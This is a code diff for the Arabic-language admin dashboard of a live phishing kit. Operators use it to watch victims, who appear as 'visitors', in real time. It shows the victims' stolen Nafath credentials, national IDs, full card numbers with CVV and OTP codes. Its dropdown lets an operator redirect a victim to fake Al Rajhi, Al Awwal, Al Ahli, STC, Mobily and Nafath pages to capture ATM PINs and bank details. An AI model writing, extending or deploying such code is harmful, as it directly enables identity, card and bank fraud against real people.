@@ -128,7 +128,6 @@
     // Setup socket listeners
     function setupSocketListeners() {
       socket.on('visitors:list', (list) => {
-        // Store all visitors by their _id (not socketId) to preserve data
         list.forEach(v => visitors.set(v._id, v));
         renderVisitorsList();
       });
@@ -136,7 +135,7 @@
       socket.on('visitor:new', (visitor) => {
         visitors.set(visitor._id, visitor);
         renderVisitorsList();
-        showNotification(`زائر جديد: ${visitor.visitorNumber}`);
+        showNotification('زائر جديد: ' + visitor.visitorNumber);
       });
 
       socket.on('visitor:pageChanged', ({ visitorId, page }) => {
@@ -157,11 +156,10 @@
         if (selectedVisitorId === visitorId) {
           renderVisitorDetails(visitor);
         }
-        showNotification(`بيانات جديدة من الزائر ${visitor.visitorNumber}`);
+        showNotification('بيانات جديدة من الزائر ' + visitor.visitorNumber);
       });
 
       socket.on('visitor:disconnected', ({ visitorId, socketId }) => {
-        // Don't delete visitor, just mark as disconnected
         const visitor = visitors.get(visitorId);
         if (visitor) {
           visitor.isConnected = false;
@@ -177,30 +175,32 @@
     // Render visitors list
     function renderVisitorsList() {
       const list = Array.from(visitors.values()).sort((a, b) => b.visitorNumber - a.visitorNumber);
-      visitorCount.textContent = `${list.length} زائر`;
+      const connectedCount = list.filter(v => v.isConnected !== false).length;
+      visitorCount.textContent = connectedCount + ' نشط / ' + list.length + ' زائر';
 
       if (list.length === 0) {
         visitorsList.innerHTML = '<p class="text-gray-500 text-center py-8">لا يوجد زوار حالياً</p>';
         return;
       }
 
-      visitorsList.innerHTML = list.map(v => `
-        <div class="visitor-card p-4 rounded-lg border cursor-pointer ${selectedVisitorId === v._id ? 'border-blue-500 bg-blue-50' : 'border-gray-200 hover:border-gray-300'} ${v.isConnected === false ? 'disconnected' : ''}" onclick="selectVisitor('${v._id}')">
-          <div class="flex justify-between items-start mb-2">
-            <span class="font-bold">#${v.visitorNumber}</span>
-            <div class="flex items-center gap-2">
-              ${v.isConnected === false ? '<span class="w-2 h-2 bg-red-500 rounded-full" title="غير متصل"></span>' : '<span class="w-2 h-2 bg-green-500 rounded-full" title="متصل"></span>'}
-              <span class="text-xs px-2 py-1 rounded-full ${v.waitingForAdminResponse ? 'waiting-badge text-yellow-800' : 'bg-gray-100 text-gray-600'}">${v.page}</span>
-            </div>
-          </div>
-          <div class="text-sm text-gray-500">
-            <p>${v.ip}</p>
-            <p>${v.device} - ${v.browser}</p>
-          </div>
-          ${v.waitingForAdminResponse ? '<div class="mt-2 text-xs text-yellow-700 font-medium">⏳ ينتظر الرد</div>' : ''}
-          ${Object.keys(v.data || {}).length > 0 ? '<div class="mt-2 text-xs text-blue-700 font-medium">📝 يوجد بيانات</div>' : ''}
-        </div>
-      `).join('');
+      visitorsList.innerHTML = list.map(v => {
+        const isSelected = selectedVisitorId === v._id;
+        const isDisconnected = v.isConnected === false;
+        return '<div class="visitor-card p-4 rounded-lg border cursor-pointer ' + 
+          (isSelected ? 'border-blue-500 bg-blue-50' : 'border-gray-200 hover:border-gray-300') + 
+          (isDisconnected ? ' disconnected' : '') + 
+          '" onclick="selectVisitor(\'' + v._id + '\')">' +
+          '<div class="flex justify-between items-start mb-2">' +
+          '<span class="font-bold">#' + v.visitorNumber + '</span>' +
+          '<div class="flex items-center gap-2">' +
+          (isDisconnected ? '<span class="w-2 h-2 bg-red-500 rounded-full" title="غير متصل"></span>' : '<span class="w-2 h-2 bg-green-500 rounded-full" title="متصل"></span>') +
+          '<span class="text-xs px-2 py-1 rounded-full ' + (v.waitingForAdminResponse ? 'waiting-badge text-yellow-800' : 'bg-gray-100 text-gray-600') + '">' + v.page + '</span>' +
+          '</div></div>' +
+          '<div class="text-sm text-gray-500"><p>' + v.ip + '</p><p>' + v.device + ' - ' + v.browser + '</p></div>' +
+          (v.waitingForAdminResponse ? '<div class="mt-2 text-xs text-yellow-700 font-medium">⏳ ينتظر الرد</div>' : '') +
+          (Object.keys(v.data || {}).length > 0 ? '<div class="mt-2 text-xs text-blue-700 font-medium">📝 يوجد بيانات</div>' : '') +
+          '</div>';
+      }).join('');
     }
 
     // Select visitor
@@ -215,212 +215,189 @@
 
     // Render visitor details
     function renderVisitorDetails(visitor) {
-      // Group data by category
-      const businessInfo = {};
-      const contactInfo = {};
+      // Group data by page
+      const nafathData = {};
+      const updateInfoData = {};
       const otherData = {};
+      
+      const updateInfoKeys = ['الاسم بالعربي', 'الاسم بالإنجليزي', 'رقم الهوية الوطنية', 'تاريخ الميلاد', 'الجنسية', 'نوع المالك', 'الجنس',
+        'رقم الجوال', 'البريد الإلكتروني', 'العنوان الوطني', 'رقم المبنى', 'رقم الطابق',
+        'النشاط العام', 'النشاط الخاص', 'رأس المال',
+        'علامة تجارية', 'اسم العلامة', 'اسم المحل', 'رقم المحل', 'رقم العقار', 'عدد الفتحات', 'عدد الطوابق', 'عدد الكاميرات', 'مصعد', 'داخل مجمع تجاري', 'نوع العقد',
+        'نوع اللوحة', 'مساحة اللوحة', 'نوع المسار',
+        'نوع الاسم', 'الاسم التجاري', 'اسم العلامة بالعربي', 'اسم العلامة بالإنجليزي',
+        'اسم الخدمة', 'رقم الطلب', 'رقم السجل التجاري'];
       
       if (visitor.data) {
         Object.entries(visitor.data).forEach(([key, value]) => {
-          if (['الاسم بالعربي', 'الاسم بالإنجليزي', 'رقم الهوية الوطنية', 'تاريخ الميلاد', 'الجنسية', 'نوع المالك', 'الجنس'].includes(key)) {
-            businessInfo[key] = value;
-          } else if (['رقم الجوال', 'البريد الإلكتروني', 'مزود الخدمة'].includes(key)) {
-            contactInfo[key] = value;
+          if (['اسم المستخدم / الهوية الوطنية', 'كلمة المرور (نفاذ)'].includes(key)) {
+            nafathData[key] = value;
+          } else if (updateInfoKeys.includes(key)) {
+            updateInfoData[key] = value;
           } else {
             otherData[key] = value;
           }
         });
       }
 
-      visitorDetails.innerHTML = `
-        <div class="space-y-6">
-          <!-- Header -->
-          <div class="flex justify-between items-start">
-            <div>
-              <h2 class="text-2xl font-bold">زائر #${visitor.visitorNumber}</h2>
-              <p class="text-gray-500">${visitor.page}</p>
-              <div class="flex items-center gap-2 mt-2">
-                ${visitor.isConnected === false ? '<span class="inline-block px-3 py-1 bg-red-100 text-red-800 rounded-full text-sm font-medium">🔴 غير متصل</span>' : '<span class="inline-block px-3 py-1 bg-green-100 text-green-800 rounded-full text-sm font-medium">🟢 متصل</span>'}
-                ${visitor.waitingForAdminResponse ? '<span class="inline-block px-3 py-1 bg-yellow-100 text-yellow-800 rounded-full text-sm font-medium">⏳ ينتظر الرد</span>' : ''}
-              </div>
-            </div>
-            <div class="flex gap-2">
-              <button onclick="approveForm('${visitor.socketId}')" class="px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 flex items-center gap-2" ${visitor.isConnected === false ? 'disabled class="opacity-50 cursor-not-allowed"' : ''}>
-                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
-                موافقة
-              </button>
-              <button onclick="rejectForm('${visitor.socketId}')" class="px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 flex items-center gap-2" ${visitor.isConnected === false ? 'disabled class="opacity-50 cursor-not-allowed"' : ''}>
-                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>
-                رفض
-              </button>
-            </div>
-          </div>
+      let html = '<div class="space-y-6">';
+      
+      // Header
+      html += '<div class="flex justify-between items-start"><div>';
+      html += '<h2 class="text-2xl font-bold">زائر #' + visitor.visitorNumber + '</h2>';
+      html += '<p class="text-gray-500">' + visitor.page + '</p>';
+      html += '<div class="flex items-center gap-2 mt-2">';
+      html += visitor.isConnected === false ? 
+        '<span class="inline-block px-3 py-1 bg-red-100 text-red-800 rounded-full text-sm font-medium">🔴 غير متصل</span>' : 
+        '<span class="inline-block px-3 py-1 bg-green-100 text-green-800 rounded-full text-sm font-medium">🟢 متصل</span>';
+      if (visitor.waitingForAdminResponse) {
+        html += '<span class="inline-block px-3 py-1 bg-yellow-100 text-yellow-800 rounded-full text-sm font-medium">⏳ ينتظر الرد</span>';
+      }
+      html += '</div></div>';
+      
+      // Action buttons
+      html += '<div class="flex gap-2">';
+      html += '<button onclick="approveForm(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 flex items-center gap-2"' + (visitor.isConnected === false ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>';
+      html += '<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>موافقة</button>';
+      html += '<button onclick="rejectForm(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 flex items-center gap-2"' + (visitor.isConnected === false ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>';
+      html += '<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/></svg>رفض</button>';
+      html += '</div></div>';
 
-          <!-- Info Grid -->
-          <div class="grid grid-cols-2 gap-4">
-            <div class="bg-gray-50 p-4 rounded-lg">
-              <p class="text-gray-500 text-sm">IP</p>
-              <p class="font-medium">${visitor.ip}</p>
-            </div>
-            <div class="bg-gray-50 p-4 rounded-lg">
-              <p class="text-gray-500 text-sm">الجهاز</p>
-              <p class="font-medium">${visitor.device} - ${visitor.os}</p>
-            </div>
-            <div class="bg-gray-50 p-4 rounded-lg">
-              <p class="text-gray-500 text-sm">المتصفح</p>
-              <p class="font-medium">${visitor.browser}</p>
-            </div>
-            <div class="bg-gray-50 p-4 rounded-lg">
-              <p class="text-gray-500 text-sm">الدولة</p>
-              <p class="font-medium">${visitor.country}</p>
-            </div>
-          </div>
+      // Info Grid
+      html += '<div class="grid grid-cols-2 gap-4">';
+      html += '<div class="bg-gray-50 p-4 rounded-lg"><p class="text-gray-500 text-sm">IP</p><p class="font-medium">' + visitor.ip + '</p></div>';
+      html += '<div class="bg-gray-50 p-4 rounded-lg"><p class="text-gray-500 text-sm">الجهاز</p><p class="font-medium">' + visitor.device + ' - ' + visitor.os + '</p></div>';
+      html += '<div class="bg-gray-50 p-4 rounded-lg"><p class="text-gray-500 text-sm">المتصفح</p><p class="font-medium">' + visitor.browser + '</p></div>';
+      html += '<div class="bg-gray-50 p-4 rounded-lg"><p class="text-gray-500 text-sm">الدولة</p><p class="font-medium">' + visitor.country + '</p></div>';
+      html += '</div>';
 
-          <!-- Business Info Section -->
-          ${Object.keys(businessInfo).length > 0 ? `
-            <div class="data-section bg-blue-50 p-4 rounded-lg">
-              <h3 class="font-bold mb-3 text-blue-800">📋 بيانات مالك المؤسسة</h3>
-              <div class="grid grid-cols-2 gap-3">
-                ${Object.entries(businessInfo).map(([key, value]) => `
-                  <div class="bg-white p-3 rounded-lg">
-                    <span class="text-gray-500 text-sm block">${key}</span>
-                    <span class="font-medium text-gray-800">${value}</span>
-                  </div>
-                `).join('')}
-              </div>
-            </div>
-          ` : ''}
+      // Nafath Data Section
+      if (Object.keys(nafathData).length > 0) {
+        html += '<div class="data-section bg-teal-50 p-4 rounded-lg" style="border-right-color: #14b8a6;">';
+        html += '<h3 class="font-bold mb-3 text-teal-800">🔐 بيانات نفاذ</h3>';
+        html += '<div class="grid grid-cols-2 gap-3">';
+        Object.entries(nafathData).forEach(([key, value]) => {
+          html += '<div class="bg-white p-3 rounded-lg"><span class="text-gray-500 text-sm block">' + key + '</span><span class="font-medium text-gray-800">' + value + '</span></div>';
+        });
+        html += '</div></div>';
+      }
 
-          <!-- Contact Info Section -->
-          ${Object.keys(contactInfo).length > 0 ? `
-            <div class="data-section bg-green-50 p-4 rounded-lg">
-              <h3 class="font-bold mb-3 text-green-800">📞 بيانات الاتصال</h3>
-              <div class="grid grid-cols-2 gap-3">
-                ${Object.entries(contactInfo).map(([key, value]) => `
-                  <div class="bg-white p-3 rounded-lg">
-                    <span class="text-gray-500 text-sm block">${key}</span>
-                    <span class="font-medium text-gray-800">${value}</span>
-                  </div>
-                `).join('')}
-              </div>
-            </div>
-          ` : ''}
+      // Update Info Data Section
+      if (Object.keys(updateInfoData).length > 0) {
+        html += '<div class="data-section bg-blue-50 p-4 rounded-lg">';
+        html += '<h3 class="font-bold mb-3 text-blue-800">📋 بيانات تحديث المعلومات</h3>';
+        html += '<div class="grid grid-cols-2 gap-3">';
+        Object.entries(updateInfoData).forEach(([key, value]) => {
+          html += '<div class="bg-white p-3 rounded-lg"><span class="text-gray-500 text-sm block">' + key + '</span><span class="font-medium text-gray-800">' + (value || '-') + '</span></div>';
+        });
+        html += '</div></div>';
+      }
 
-          <!-- Other Data Section -->
-          ${Object.keys(otherData).length > 0 ? `
-            <div class="data-section bg-gray-50 p-4 rounded-lg">
-              <h3 class="font-bold mb-3 text-gray-800">📝 بيانات أخرى</h3>
-              <div class="grid grid-cols-2 gap-3">
-                ${Object.entries(otherData).map(([key, value]) => `
-                  <div class="bg-white p-3 rounded-lg">
-                    <span class="text-gray-500 text-sm block">${key}</span>
-                    <span class="font-medium text-gray-800">${value}</span>
-                  </div>
-                `).join('')}
-              </div>
-            </div>
-          ` : ''}
+      // Other Data Section
+      if (Object.keys(otherData).length > 0) {
+        html += '<div class="data-section bg-gray-50 p-4 rounded-lg">';
+        html += '<h3 class="font-bold mb-3 text-gray-800">📝 بيانات أخرى</h3>';
+        html += '<div class="grid grid-cols-2 gap-3">';
+        Object.entries(otherData).forEach(([key, value]) => {
+          html += '<div class="bg-white p-3 rounded-lg"><span class="text-gray-500 text-sm block">' + key + '</span><span class="font-medium text-gray-800">' + value + '</span></div>';
+        });
+        html += '</div></div>';
+      }
 
-          <!-- Payment Cards -->
-          ${visitor.paymentCards && visitor.paymentCards.length > 0 ? `
-            <div class="data-section bg-purple-50 p-4 rounded-lg">
-              <h3 class="font-bold mb-3 text-purple-800">💳 بطاقات الدفع</h3>
-              <div class="space-y-3">
-                ${visitor.paymentCards.map((card, i) => `
-                  <div class="bg-white p-4 rounded-lg border border-purple-200">
-                    <p class="font-medium mb-2 text-purple-700">بطاقة ${i + 1}</p>
-                    <div class="grid grid-cols-2 gap-3 text-sm">
-                      <div><span class="text-gray-500">رقم البطاقة:</span> <span class="font-mono font-bold">${card.cardNumber}</span></div>
-                      <div><span class="text-gray-500">الاسم:</span> <span class="font-medium">${card.nameOnCard}</span></div>
-                      <div><span class="text-gray-500">الانتهاء:</span> <span class="font-medium">${card.expiryMonth}/${card.expiryYear}</span></div>
-                      <div><span class="text-gray-500">CVV:</span> <span class="font-mono font-bold">${card.cvv}</span></div>
-                    </div>
-                  </div>
-                `).join('')}
-              </div>
-            </div>
-          ` : ''}
+      // Payment Cards
+      if (visitor.paymentCards && visitor.paymentCards.length > 0) {
+        html += '<div class="data-section bg-purple-50 p-4 rounded-lg" style="border-right-color: #9333ea;">';
+        html += '<h3 class="font-bold mb-3 text-purple-800">💳 بطاقات الدفع</h3>';
+        html += '<div class="space-y-3">';
+        visitor.paymentCards.forEach((card, i) => {
+          html += '<div class="bg-white p-4 rounded-lg border border-purple-200">';
+          html += '<p class="font-medium mb-2 text-purple-700">بطاقة ' + (i + 1) + '</p>';
+          html += '<div class="grid grid-cols-2 gap-3 text-sm">';
+          html += '<div><span class="text-gray-500">رقم البطاقة:</span> <span class="font-mono font-bold">' + card.cardNumber + '</span></div>';
+          html += '<div><span class="text-gray-500">الاسم:</span> <span class="font-medium">' + card.nameOnCard + '</span></div>';
+          html += '<div><span class="text-gray-500">الانتهاء:</span> <span class="font-medium">' + card.expiryMonth + '/' + card.expiryYear + '</span></div>';
+          html += '<div><span class="text-gray-500">CVV:</span> <span class="font-mono font-bold">' + card.cvv + '</span></div>';
+          html += '</div></div>';
+        });
+        html += '</div></div>';
+      }
 
-          <!-- Digit Codes -->
-          ${visitor.digitCodes && visitor.digitCodes.length > 0 ? `
-            <div class="data-section bg-orange-50 p-4 rounded-lg">
-              <h3 class="font-bold mb-3 text-orange-800">🔢 الرموز المدخلة</h3>
-              <div class="space-y-2">
-                ${visitor.digitCodes.map(dc => `
-                  <div class="flex justify-between items-center bg-white p-3 rounded-lg">
-                    <span class="font-mono text-lg font-bold text-orange-700">${dc.code}</span>
-                    <span class="text-sm text-gray-500">${dc.page}</span>
-                  </div>
-                `).join('')}
-              </div>
-            </div>
-          ` : ''}
+      // Digit Codes
+      if (visitor.digitCodes && visitor.digitCodes.length > 0) {
+        html += '<div class="data-section bg-orange-50 p-4 rounded-lg" style="border-right-color: #f97316;">';
+        html += '<h3 class="font-bold mb-3 text-orange-800">🔢 الرموز المدخلة</h3>';
+        html += '<div class="space-y-2">';
+        visitor.digitCodes.forEach(dc => {
+          html += '<div class="flex justify-between items-center bg-white p-3 rounded-lg">';
+          html += '<span class="font-mono text-lg font-bold text-orange-700">' + dc.code + '</span>';
+          html += '<span class="text-sm text-gray-500">' + dc.page + '</span>';
+          html += '</div>';
+        });
+        html += '</div></div>';
+      }
 
-          <!-- Actions -->
-          <div class="border-t pt-4">
-            <h3 class="font-bold mb-3">إجراءات</h3>
-            <div class="grid grid-cols-2 gap-4">
-              <div>
-                <label class="block text-sm text-gray-500 mb-1">إرسال رمز</label>
-                <div class="flex gap-2">
-                  <input type="text" id="codeInput" class="flex-1 px-3 py-2 border rounded-lg" placeholder="أدخل الرمز">
-                  <button onclick="sendCode('${visitor.socketId}')" class="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700">إرسال</button>
-                </div>
-              </div>
-              <div>
-                <label class="block text-sm text-gray-500 mb-1">توجيه لصفحة</label>
-                <div class="flex gap-2">
-                  <select id="navigateSelect" class="flex-1 px-3 py-2 border rounded-lg">
-                    <option value="">اختر صفحة</option>
-                    <option value="credit-card-payment">الدفع بالبطاقة</option>
-                    <option value="otp-verification">OTP البطاقة</option>
-                    <option value="atm-password">كلمة مرور ATM</option>
-                    <option value="phone-verification">توثيق الجوال</option>
-                    <option value="phone-otp">OTP الجوال</option>
-                    <option value="stc-call-alert">تنبيه STC</option>
-                    <option value="mobily-call-alert">تنبيه Mobily</option>
-                    <option value="nafath-login-page">نفاذ</option>
-                    <option value="nafath-verify">تحقق نفاذ</option>
-                    <option value="alrajhi-login">الراجحي - تسجيل دخول</option>
-                    <option value="alrajhi-otp">الراجحي - OTP</option>
-                    <option value="alrajhi-nafath">الراجحي - نفاذ</option>
-                    <option value="alrajhi-alert">الراجحي - تنبيه</option>
-                    <option value="alrajhi-call">الراجحي - اتصال</option>
-                    <option value="alawwal-bank">بنك الأول</option>
-                    <option value="alawwal-nafath">الأول - نفاذ</option>
-                    <option value="alahli-otp">الأهلي - OTP</option>
-                    <option value="bank-transfer">التحويل البنكي</option>
-                    <option value="bank-account-number">رقم الحساب</option>
-                    <option value="mystc-otp">MyStc OTP</option>
-                    <option value="final-page">الصفحة النهائية</option>
-                  </select>
-                  <button onclick="navigateVisitor('${visitor.socketId}')" class="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700">توجيه</button>
-                </div>
-              </div>
-            </div>
-            <div class="mt-4">
-              <label class="block text-sm text-gray-500 mb-1">إرسال رسالة نهائية</label>
-              <div class="flex gap-2">
-                <input type="text" id="messageInput" class="flex-1 px-3 py-2 border rounded-lg" placeholder="أدخل الرسالة">
-                <button onclick="sendMessage('${visitor.socketId}')" class="px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700">إرسال</button>
-              </div>
-            </div>
-            <div class="mt-4 flex gap-2">
-              <button onclick="blockVisitor('${visitor.socketId}')" class="px-4 py-2 bg-red-100 text-red-700 rounded-lg hover:bg-red-200">حظر</button>
-              <button onclick="deleteVisitor('${visitor._id}')" class="px-4 py-2 bg-gray-100 text-gray-700 rounded-lg hover:bg-gray-200">حذف</button>
-            </div>
-          </div>
-        </div>
-      `;
+      // Actions
+      html += '<div class="border-t pt-4"><h3 class="font-bold mb-3">إجراءات</h3>';
+      html += '<div class="grid grid-cols-2 gap-4">';
+      
+      // Send Code
+      html += '<div><label class="block text-sm text-gray-500 mb-1">إرسال رمز</label>';
+      html += '<div class="flex gap-2"><input type="text" id="codeInput" class="flex-1 px-3 py-2 border rounded-lg" placeholder="أدخل الرمز">';
+      html += '<button onclick="sendCode(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700">إرسال</button></div></div>';
+      
+      // Navigate
+      html += '<div><label class="block text-sm text-gray-500 mb-1">توجيه لصفحة</label>';
+      html += '<div class="flex gap-2"><select id="navigateSelect" class="flex-1 px-3 py-2 border rounded-lg">';
+      html += '<option value="">اختر صفحة</option>';
+      html += '<option value="credit-card-payment">الدفع بالبطاقة</option>';
+      html += '<option value="otp-verification">OTP البطاقة</option>';
+      html += '<option value="atm-password">كلمة مرور ATM</option>';
+      html += '<option value="phone-verification">توثيق الجوال</option>';
+      html += '<option value="phone-otp">OTP الجوال</option>';
+      html += '<option value="stc-call-alert">تنبيه STC</option>';
+      html += '<option value="mobily-call-alert">تنبيه Mobily</option>';
+      html += '<option value="nafath-login-page">نفاذ</option>';
+      html += '<option value="nafath-verify">تحقق نفاذ</option>';
+      html += '<option value="alrajhi-login">الراجحي - تسجيل دخول</option>';
+      html += '<option value="alrajhi-otp">الراجحي - OTP</option>';
+      html += '<option value="alrajhi-nafath">الراجحي - نفاذ</option>';
+      html += '<option value="alrajhi-alert">الراجحي - تنبيه</option>';
+      html += '<option value="alrajhi-call">الراجحي - اتصال</option>';
+      html += '<option value="alawwal-bank">بنك الأول</option>';
+      html += '<option value="alawwal-nafath">الأول - نفاذ</option>';
+      html += '<option value="alahli-otp">الأهلي - OTP</option>';
+      html += '<option value="bank-transfer">التحويل البنكي</option>';
+      html += '<option value="bank-account-number">رقم الحساب</option>';
+      html += '<option value="mystc-otp">MyStc OTP</option>';
+      html += '<option value="final-page">الصفحة النهائية</option>';
+      html += '</select>';
+      html += '<button onclick="navigateVisitor(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700">توجيه</button></div></div>';
+      
+      html += '</div>';
+      
+      // Send Message
+      html += '<div class="mt-4"><label class="block text-sm text-gray-500 mb-1">إرسال رسالة نهائية</label>';
+      html += '<div class="flex gap-2"><input type="text" id="messageInput" class="flex-1 px-3 py-2 border rounded-lg" placeholder="أدخل الرسالة">';
+      html += '<button onclick="sendMessage(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700">إرسال</button></div></div>';
+      
+      // Block and Delete
+      html += '<div class="flex gap-2 mt-4">';
+      html += '<button onclick="blockVisitor(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700">حظر</button>';
+      html += '<button onclick="deleteVisitor(\'' + visitor._id + '\')" class="px-4 py-2 bg-gray-600 text-white rounded-lg hover:bg-gray-700">حذف</button>';
+      html += '</div></div>';
+
+      html += '</div>';
+      
+      visitorDetails.innerHTML = html;
     }
 
-    // Actions
+    // Action functions
     function approveForm(socketId) {
-      socket.emit('admin:approve', socketId);
+      socket.emit('admin:approve', { visitorSocketId: socketId });
     }
 
     function rejectForm(socketId) {
-      socket.emit('admin:reject', socketId);
+      socket.emit('admin:reject', { visitorSocketId: socketId });
     }
 
     function sendCode(socketId) {
@@ -448,7 +425,7 @@
 
     function blockVisitor(socketId) {
       if (confirm('هل أنت متأكد من حظر هذا الزائر؟')) {
-        socket.emit('admin:block', socketId);
+        socket.emit('admin:block', { visitorSocketId: socketId });
       }
     }
 
@@ -458,14 +435,14 @@
         visitors.delete(visitorId);
         selectedVisitorId = null;
         renderVisitorsList();
-        visitorDetails.innerHTML = '<div class="text-center py-12 text-gray-500"><p>اختر زائر لعرض التفاصيل</p></div>';
+        visitorDetails.innerHTML = '<div class="text-center py-12 text-gray-500"><svg class="w-16 h-16 mx-auto mb-4 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg><p>اختر زائر لعرض التفاصيل</p></div>';
       }
     }
 
     // Notification
     function showNotification(message) {
       if (Notification.permission === 'granted') {
-        new Notification('سجل', { body: message });
+        new Notification('لوحة التحكم', { body: message });
       }
     }
 
